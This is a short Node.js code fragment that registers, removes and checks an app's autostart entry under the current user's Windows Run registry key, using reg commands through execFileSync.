const RUN_KEY = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";

function installWindows() {
    const value = `"${NODE_PATH}" "${SCRIPT_PATH}"`;
    execFileSync("reg", [
        "add", RUN_KEY,
        "/v", APP_NAME,
        "/t", "REG_SZ",
        "/d", value,
        "/f",
    ]);
}

function uninstallWindows() {
    execFileSync("reg", [
        "delete", RUN_KEY,
        "/v", APP_NAME,
        "/f",
    ]);
}

function isInstalledWindows() {
    try {
        execFileSync("reg", ["query", RUN_KEY, "/v", APP_NAME], { stdio: "ignore" });
        return true;
    } catch {
        return false;
    }
}

